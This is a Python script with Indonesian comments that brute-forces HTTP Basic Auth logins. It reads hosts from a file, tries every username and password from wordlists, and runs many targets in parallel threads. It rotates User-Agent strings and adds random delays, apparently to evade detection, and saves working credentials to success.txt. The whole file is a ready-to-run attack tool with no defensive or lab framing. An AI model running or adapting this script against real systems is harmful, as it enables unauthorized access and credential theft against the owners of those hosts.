import os
import requests
import logging
import random
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# Logging configuration
logging.basicConfig(filename="errors.log", level=logging.ERROR, format="%(asctime)s - %(levelname)s - %(message)s")

# Configuration
HOSTS_FILE = "host2.txt"  # File eksternal berisi daftar host
CREDENTIALS_DIR = "credentials"
USER_LIST = os.path.join(CREDENTIALS_DIR, "users.txt")
PASS_LIST = os.path.join(CREDENTIALS_DIR, "passwd.txt")
MAX_CONCURRENT_PORTS = 50
TIMEOUT = 7
SUCCESS_FILE = "success.txt"

# Daftar User-Agent untuk rotasi
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
]

def load_hosts():
    """Membaca daftar host dari file eksternal."""
    try:
        with open(HOSTS_FILE, "r") as file:
            hosts_by_port = {}
            for line in file:
                line = line.strip()
                if line:
                    try:
                        host, port = line.rsplit(":", 1)
                        port = port.strip()
                        if not port.isdigit() or not (1 <= int(port) <= 65535):
                            logging.error(f"Invalid port in {line}")
                            continue
                        if port not in hosts_by_port:
                            hosts_by_port[port] = []
                        hosts_by_port[port].append(f"{host}:{port}")
                    except ValueError:
                        logging.error(f"Invalid format in {line}")
            if not hosts_by_port:
                raise ValueError(f"No valid hosts found in {HOSTS_FILE}")
            return hosts_by_port
    except FileNotFoundError:
        print(f"Error: {HOSTS_FILE} not found.")
        exit(1)

def brute_force_host(host):
    """Melakukan brute force pada satu host dengan User-Agent acak."""
    try:
        with open(USER_LIST, "r") as ul, open(PASS_LIST, "r") as pl:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive"
            }
            for username in ul:
                username = username.strip()
                for password in pl:
                    password = password.strip()
                    url = f"http://{host}"
                    try:
                        response = requests.get(url, auth=(username, password), headers=headers, timeout=TIMEOUT)
                        if response.status_code == 200:
                            with open(SUCCESS_FILE, "a") as sf:
                                sf.write(f"{host} - {username}:{password}\n")
                            return True
                        elif response.status_code == 401:
                            continue
                        else:
                            logging.info(f"Unexpected HTTP status for {url}: {response.status_code}")
                    except requests.exceptions.RequestException as e:
                        logging.error(f"Request error for {url}: {e}")
                    time.sleep(random.uniform(0.1, 0.5))
    except Exception as e:
        logging.error(f"Error brute-forcing {host}: {e}")
    return False

def brute_force_port(port, hosts):
    """Melakukan brute force untuk semua host pada port tertentu."""
    for host in hosts:
        brute_force_host(host)

def show_progress():
    """Menampilkan indikator progres berputar."""
    spinner = ["|", "/", "-", "\\"]
    i = 0
    while True:
        sys.stdout.write(f"\rScript sedang berjalan... {spinner[i % 4]}")
        sys.stdout.flush()
        time.sleep(0.2)
        i += 1

def run_brute_force_dynamically(hosts_by_port):
    """Menjalankan brute force secara paralel untuk semua port."""
    import threading
    # Jalankan indikator progres di thread terpisah
    progress_thread = threading.Thread(target=show_progress, daemon=True)
    progress_thread.start()

    with ThreadPoolExecutor(max_workers=MAX_CONCURRENT_PORTS) as executor:
        futures = {executor.submit(brute_force_port, port, hosts): port for port, hosts in hosts_by_port.items()}
        for future in as_completed(futures):
            port = futures[future]
            try:
                future.result()
            except Exception as e:
                logging.error(f"Error in brute force task for port {port}: {e}")

if __name__ == "__main__":
    print(f"Loading hosts from {HOSTS_FILE}...")
    hosts_by_port = load_hosts()

    print("Starting brute force attacks for all ports...")
    run_brute_force_dynamically(hosts_by_port)
    print("\rBrute force operations completed. Results saved in success.txt.")